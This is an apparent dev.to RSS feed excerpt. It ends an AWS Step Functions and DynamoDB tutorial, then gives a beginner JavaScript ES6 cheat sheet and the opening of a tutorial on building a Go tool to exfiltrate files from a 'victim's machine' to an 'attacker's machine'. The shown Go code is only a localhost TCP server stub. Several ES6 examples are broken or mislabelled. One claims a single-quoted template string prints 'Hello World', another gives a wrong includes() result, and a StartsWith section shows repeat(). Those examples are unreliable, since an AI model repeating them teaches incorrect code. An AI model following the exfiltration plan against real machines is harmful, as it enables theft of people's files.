&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UZkkN9C5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2c7x0afxu0sbz0hyvbzg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UZkkN9C5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2c7x0afxu0sbz0hyvbzg.png" alt="Choice" width="880" height="404"&gt;&lt;/a&gt;&lt;br&gt;
During the &lt;em&gt;DynamoDB&lt;/em&gt; step we can view the details of what inputs was passed to the step and you can understand how the JSON mapping would have worked in that iteration.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--s_85ceGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn2o2uhhtd8r0ro6yrkv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--s_85ceGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn2o2uhhtd8r0ro6yrkv.png" alt="Image description" width="880" height="378"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#dynamodb-queries"&gt;
  &lt;/a&gt;
  DynamoDB queries
&lt;/h3&gt;

&lt;p&gt;Once the execution is completed, all the text which is extracted from the document itself, you can find it in DynamoDB. And then you can build your DynamoDB &lt;code&gt;query&lt;/code&gt; and &lt;code&gt;scan&lt;/code&gt; which suits the search need. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#getting-all-the-keywords-of-an-image"&gt;
  &lt;/a&gt;
  Getting all the keywords of an image
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jotw5w9b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/covstekcc4u5rkdn5dak.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jotw5w9b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/covstekcc4u5rkdn5dak.png" alt="query" width="880" height="367"&gt;&lt;/a&gt; &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fyjcRdKf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zyw3k8xnjrmzvpm06o0r.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fyjcRdKf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zyw3k8xnjrmzvpm06o0r.png" alt="all the keywords of an image" width="644" height="886"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#getting-all-the-images-which-matches-the-keyword"&gt;
  &lt;/a&gt;
  Getting all the images which matches the keyword
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kMIGJdcf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oy5o5xkw8x40yvlurwuy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kMIGJdcf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oy5o5xkw8x40yvlurwuy.png" alt="scan" width="880" height="549"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;With Step Function and SDK integration it becomes a seemless low-code integration for your serverless workflows as explained in this blog-post. This also eliminates having Lambda functions which would be processing all of these. &lt;/p&gt;

</description>
      <category>aws</category>
      <category>stepfunctions</category>
      <category>serverless</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>JavaScript ES6</title>
      <author>Buddhadeb Chhetri</author>
      <pubDate>Sun, 23 Jan 2022 18:08:31 +0000</pubDate>
      <link>https://dev.to/buddhadebchhetri/javascript-es6-ilj</link>
      <guid>https://dev.to/buddhadebchhetri/javascript-es6-ilj</guid>
      <description>&lt;p&gt;JavaScript was invented by Brendan Eich in 1995, and became an ECMA standard in 1997.&lt;/p&gt;

&lt;p&gt;ECMAScript is the official name of the language.&lt;/p&gt;

&lt;p&gt;ECMAScript versions have been abbreviated to ES1, ES2, ES3, ES5, and ES6.&lt;/p&gt;

&lt;p&gt;Since 2016 new versions are named by year (ECMAScript 2016 / 2017 / 2018).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#arrow-function"&gt;
  &lt;/a&gt;
  Arrow Function
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//prints 8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#default-parameters"&gt;
  &lt;/a&gt;
  Default parameters
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="c1"&gt;//prints 5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#let-scope"&gt;
  &lt;/a&gt;
  Let Scope
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//prints 5&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//prints 3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#const"&gt;
  &lt;/a&gt;
  Const
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;//can be assigned only once&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// Here x is 50&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// Here x is 16&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Here x is 50&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#multiline-string"&gt;
  &lt;/a&gt;
  Multiline String
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;This is a multiline string&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#template-string"&gt;
  &lt;/a&gt;
  Template string
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;World&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Hello ${name}&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//Prints Hello World&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#exponent-operator"&gt;
  &lt;/a&gt;
  Exponent Operator
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="c1"&gt;//same as : Math.pow(2,8)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#spread-operator"&gt;
  &lt;/a&gt;
  Spread Operator
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;Const&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[...&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,...&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="c1"&gt;//[1,2,3,4]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#string-includes"&gt;
  &lt;/a&gt;
  String Includes()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;p1))
//Prints true
console.log(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;.includes(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;tt&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="c1"&gt;//prints false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#string-startswith"&gt;
  &lt;/a&gt;
  String StartsWith()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ab.repeat(3))
//prints &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;ababab&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destructuring-array"&gt;
  &lt;/a&gt;
  Destructuring array
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//3&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//7&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destucturing-object"&gt;
  &lt;/a&gt;
  Destucturing object
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//55&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//44&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#object-property-assignment"&gt;
  &lt;/a&gt;
  Object property assignment
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="c1"&gt;//before es6:&lt;/span&gt;
&lt;span class="c1"&gt;//obj ={a:a,b:b}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;obj3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//{a:2,b:5}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#objectassign"&gt;
  &lt;/a&gt;
  Object.Assign()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;assign&lt;/span&gt;&lt;span class="p"&gt;({},&lt;/span&gt;&lt;span class="nx"&gt;obj1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;obj2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;obj3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//{a:1 ,b:2}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#promises-with-finally"&gt;
  &lt;/a&gt;
  Promises with finally
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;promise&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{...})&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{..})&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;//Logic independent of success/error &lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>javascript</category>
      <category>beginners</category>
      <category>bestofdev</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Hack and Exfiltrate text files using GoLang</title>
      <author>Vedant Pareek</author>
      <pubDate>Sun, 23 Jan 2022 18:07:16 +0000</pubDate>
      <link>https://dev.to/dunefro/hack-and-exfiltrate-text-files-using-golang-14gg</link>
      <guid>https://dev.to/dunefro/hack-and-exfiltrate-text-files-using-golang-14gg</guid>
      <description>&lt;p&gt;This article will help you to write a Golang program which will transfer files from the remote machine (victim's machine) to your local environment(attacker's machine).&lt;/p&gt;

&lt;p&gt;This article is mainly for education purposes and can be used for small pen-testing scenarios as well ( I have used it and it really works). We can use tools like &lt;code&gt;scp&lt;/code&gt; and &lt;code&gt;nc&lt;/code&gt; as well to transfer file data but we here get a chance to do the same natively using Golang.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#plan-of-action"&gt;
  &lt;/a&gt;
  Plan of Action
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Setting up your workspace&lt;/li&gt;
&lt;li&gt;Create a TCP server which opens a TCP port for data transfer.&lt;/li&gt;
&lt;li&gt;Transfer data using &lt;code&gt;netcat&lt;/code&gt; to check connectivity.&lt;/li&gt;
&lt;li&gt;Concurrently listen to the data being sent.&lt;/li&gt;
&lt;li&gt;Create a client that sends data to the server.&lt;/li&gt;
&lt;li&gt;Modify the client to read a file and send data to the server.&lt;/li&gt;
&lt;li&gt;Create a CLI app using &lt;code&gt;cobra&lt;/code&gt; to combine client and server in a single application and use arguments to accept file names, hostname or IP address and port to connect.&lt;/li&gt;
&lt;li&gt;Make it Windows and Linux suitable. (For you to hack some readable windows file)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#lets-begin"&gt;
  &lt;/a&gt;
  Let's begin
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#setting-up-your-workspace"&gt;
  &lt;/a&gt;
  Setting up your workspace
&lt;/h3&gt;

&lt;p&gt;First we create a folder called &lt;code&gt;data_exfiltrator&lt;/code&gt; in which our application will reside. Inside this we will create a folder called &lt;code&gt;server&lt;/code&gt; which will contain a file called &lt;code&gt;server.go&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;data_exfiltrator
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#tcp-server"&gt;
  &lt;/a&gt;
  TCP server
&lt;/h3&gt;

&lt;p&gt;Now we will create a simple TCP server. For this we are using &lt;code&gt;127.0.0.1&lt;/code&gt; (localhost) and port 8080 to bind the server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import "fmt"

// constant used for connections
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will open a socket so that we can use it as a server. For this we will try the &lt;code&gt;net&lt;/code&gt; package, natively provided to us, by Golang which is used for providing portable interface for network connections. &lt;code&gt;net&lt;/code&gt; package is easy to start with. &lt;/p&gt;

